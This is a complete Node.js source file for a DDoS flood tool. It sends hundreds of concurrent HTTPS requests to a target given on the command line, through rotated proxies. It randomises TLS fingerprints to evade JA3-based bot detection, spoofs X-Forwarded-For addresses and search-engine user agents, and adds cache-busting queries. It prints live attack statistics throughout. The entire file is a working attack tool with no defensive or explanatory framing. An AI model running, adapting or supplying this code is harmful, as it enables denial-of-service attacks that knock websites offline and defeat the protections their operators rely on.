const https = require('https');
const http = require('http');
const tls = require('tls');
const url = require('url');
const fs = require('fs');
const crypto = require('crypto');
const net = require('net');

const TARGET_URL = process.argv[2];
const THREADS = parseInt(process.argv[3] || '500');
const REQUEST_DELAY = parseInt(process.argv[4] || '10');
const DURATION = parseInt(process.argv[5] || '360') * 60 * 1000;
const PROXY_FILE = 'proxy.txt';

const TLS_CIPHERS = [
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'TLS_AES_128_GCM_SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'DHE-RSA-AES128-GCM-SHA256',
    'DHE-RSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES128-SHA256',
    'ECDHE-RSA-AES256-SHA384',
    'AES128-GCM-SHA256',
    'AES256-GCM-SHA384'
];

const TLS_MIN_VERSIONS = ['TLSv1.2', 'TLSv1.1', 'TLSv1'];
const TLS_MAX_VERSIONS = ['TLSv1.3', 'TLSv1.2'];

const EC_CURVES = ['X25519', 'P-256', 'P-384', 'P-521', 'secp256k1'];

const COMMON_PORTS = [443, 8443, 4433, 4443, 9443, 10443];

const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Googlebot/2.1 (+http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'
];

let proxyList = [];
let activeIntervals = [];
let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let statusCodes = {};
let startTime = Date.now();

try {
    const data = fs.readFileSync(PROXY_FILE, 'utf8');
    proxyList = data.split('\n')
        .map(line => line.trim())
        .filter(line => line !== '' && !line.startsWith('#'));
    if (proxyList.length === 0) {
        console.log('Empty proxy file. Using direct connections.');
    }
} catch (err) {
    console.log('No proxy file found. Using direct connections.');
}

function getRandomItem(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function getRandomProxy() {
    if (proxyList.length === 0) return null;
    const proxyStr = getRandomItem(proxyList);
    const parts = proxyStr.split(':');
    if (parts.length !== 2 && parts.length !== 4) return null;
    return {
        host: parts[0],
        port: parseInt(parts[1]),
        user: parts.length === 4 ? parts[2] : null,
        pass: parts.length === 4 ? parts[3] : null
    };
}

function getRandomTlsOptions(hostname) {
    const minVersion = getRandomItem(TLS_MIN_VERSIONS);
    const maxVersion = getRandomItem(TLS_MAX_VERSIONS);
    return {
        rejectUnauthorized: false,
        requestCert: false,
        minVersion: minVersion,
        maxVersion: maxVersion,
        ciphers: TLS_CIPHERS.join(':'),
        ecdhCurve: getRandomItem(EC_CURVES),
        honorCipherOrder: Math.random() > 0.5,
        servername: hostname,
        checkServerIdentity: () => undefined,
        sessionTimeout: Math.floor(Math.random() * 300) + 10,
        enableTrace: false,
        ALPNProtocols: [getRandomItem(['h2', 'http/1.1', 'http/1.0'])]
    };
}

function displayBanner() {
    console.clear();
    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    const rps = elapsed > 0 ? Math.floor(totalRequests / elapsed) : 0;
    const remaining = Math.max(0, Math.floor((DURATION - (Date.now() - startTime)) / 1000));
    console.log('============================================================');
    console.log('  TARGET: ' + TARGET_URL);
    console.log('  MODE: TLS BYPASS + JA3 RANDOMIZATION');
    console.log('  PROXIES LOADED: ' + proxyList.length);
    console.log('============================================================');
    console.log('  TOTAL REQUESTS:  ' + totalRequests);
    console.log('  SUCCESS:         ' + successCount);
    console.log('  ERRORS:          ' + errorCount);
    console.log('  ACTIVE THREADS:  ' + activeIntervals.length);
    console.log('  REQUESTS/SEC:    ' + rps);
    console.log('  ELAPSED:         ' + elapsed + 's');
    console.log('  REMAINING:       ' + remaining + 's');
    console.log('------------------------------------------------------------');
    console.log('  STATUS CODES:');
    for (const code in statusCodes) {
        const bar = '#'.repeat(Math.floor((statusCodes[code] / Math.max(totalRequests, 1)) * 30) || 0);
        console.log('  ' + code + ' : ' + statusCodes[code] + ' ' + bar);
    }
    console.log('============================================================');
}

function sendTlsBypassDirect(targetHost, targetPort) {
    return new Promise((resolve) => {
        try {
            const tlsOptions = getRandomTlsOptions(targetHost);
            const socket = tls.connect(targetPort, targetHost, tlsOptions, () => {
                const headers = [
                    `GET /?${crypto.randomBytes(8).toString('hex')} HTTP/1.1`,
                    `Host: ${targetHost}`,
                    `User-Agent: ${getRandomItem(USER_AGENTS)}`,
                    `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
                    `Accept-Language: en-US,en;q=0.9`,
                    `Accept-Encoding: gzip, deflate, br`,
                    `Cache-Control: no-cache`,
                    `X-Forwarded-For: ${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
                    `Connection: keep-alive`,
                    ``,
                    ``
                ].join('\r\n');
                socket.write(headers);
                socket.on('data', (data) => {
                    const response = data.toString();
                    const statusMatch = response.match(/HTTP\/1\.\d (\d{3})/);
                    if (statusMatch) {
                        const code = statusMatch[1];
                        statusCodes[code] = (statusCodes[code] || 0) + 1;
                        if (code.startsWith('2') || code.startsWith('3')) successCount++;
                        else errorCount++;
                    }
                    totalRequests++;
                    displayBanner();
                    socket.end();
                    resolve();
                });
            });
            socket.on('error', () => {
                errorCount++;
                totalRequests++;
                statusCodes['TLS_ERR'] = (statusCodes['TLS_ERR'] || 0) + 1;
                displayBanner();
                resolve();
            });
            socket.on('timeout', () => {
                socket.destroy();
                errorCount++;
                totalRequests++;
                statusCodes['TIMEOUT'] = (statusCodes['TIMEOUT'] || 0) + 1;
                displayBanner();
                resolve();
            });
            socket.setTimeout(5000);
        } catch (e) {
            errorCount++;
            totalRequests++;
            statusCodes['EXCEPTION'] = (statusCodes['EXCEPTION'] || 0) + 1;
            displayBanner();
            resolve();
        }
    });
}

function sendTlsBypassProxy(proxy, targetHost, targetPort) {
    return new Promise((resolve) => {
        try {
            const proxyOptions = {
                hostname: proxy.host,
                port: proxy.port,
                method: 'CONNECT',
                path: `${targetHost}:${targetPort}`,
                timeout: 5000
            };
            if (proxy.user && proxy.pass) {
                proxyOptions.headers = {
                    'Proxy-Authorization': 'Basic ' + Buffer.from(`${proxy.user}:${proxy.pass}`).toString('base64')
                };
            }
            const req = http.request(proxyOptions);
            req.on('connect', (res, socket) => {
                const tlsOptions = getRandomTlsOptions(targetHost);
                const tlsSocket = tls.connect({
                    socket: socket,
                    rejectUnauthorized: false,
                    requestCert: false,
                    minVersion: tlsOptions.minVersion,
                    maxVersion: tlsOptions.maxVersion,
                    ciphers: tlsOptions.ciphers,
                    ecdhCurve: tlsOptions.ecdhCurve,
                    honorCipherOrder: tlsOptions.honorCipherOrder,
                    servername: tlsOptions.servername,
                    checkServerIdentity: tlsOptions.checkServerIdentity,
                    ALPNProtocols: tlsOptions.ALPNProtocols
                }, () => {
                    const headers = [
                        `GET /?${crypto.randomBytes(8).toString('hex')} HTTP/1.1`,
                        `Host: ${targetHost}`,
                        `User-Agent: ${getRandomItem(USER_AGENTS)}`,
                        `Accept: */*`,
                        `X-Forwarded-For: ${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
                        `Connection: close`,
                        ``,
                        ``
                    ].join('\r\n');
                    tlsSocket.write(headers);
                    tlsSocket.on('data', (data) => {
                        const response = data.toString();
                        const statusMatch = response.match(/HTTP\/1\.\d (\d{3})/);
                        if (statusMatch) {
                            const code = statusMatch[1];
                            statusCodes[code] = (statusCodes[code] || 0) + 1;
                            if (code.startsWith('2') || code.startsWith('3')) successCount++;
                            else errorCount++;
                        }
                        totalRequests++;
                        displayBanner();
                        tlsSocket.end();
                        resolve();
                    });
                });
                tlsSocket.on('error', () => {
                    errorCount++;
                    totalRequests++;
                    statusCodes['TLS_ERR'] = (statusCodes['TLS_ERR'] || 0) + 1;
                    displayBanner();
                    resolve();
                });
                tlsSocket.setTimeout(5000);
            });
            req.on('error', () => {
                errorCount++;
                totalRequests++;
                statusCodes['PROXY_ERR'] = (statusCodes['PROXY_ERR'] || 0) + 1;
                displayBanner();
                resolve();
            });
            req.on('timeout', () => {
                req.destroy();
                errorCount++;
                totalRequests++;
                statusCodes['TIMEOUT'] = (statusCodes['TIMEOUT'] || 0) + 1;
                displayBanner();
                resolve();
            });
            req.end();
        } catch (e) {
            errorCount++;
            totalRequests++;
            statusCodes['EXCEPTION'] = (statusCodes['EXCEPTION'] || 0) + 1;
            displayBanner();
            resolve();
        }
    });
}

async function floodRequest() {
    const target = url.parse(TARGET_URL);
    const targetHost = target.hostname;
    const targetPort = getRandomItem(COMMON_PORTS);
    const proxy = getRandomProxy();
    if (proxy) {
        await sendTlsBypassProxy(proxy, targetHost, targetPort);
    } else {
        await sendTlsBypassDirect(targetHost, targetPort);
    }
}

function startThread() {
    const intervalId = setInterval(() => {
        floodRequest();
    }, REQUEST_DELAY);
    activeIntervals.push(intervalId);
}

function stopAll() {
    activeIntervals.forEach(id => clearInterval(id));
    activeIntervals = [];
    console.log('\nAttack finished. Total requests: ' + totalRequests);
    process.exit(0);
}

displayBanner();
console.log('Starting TLS bypass attack...');

for (let i = 0; i < THREADS; i++) {
    setTimeout(() => startThread(), i * 5);
}

setTimeout(() => stopAll(), DURATION);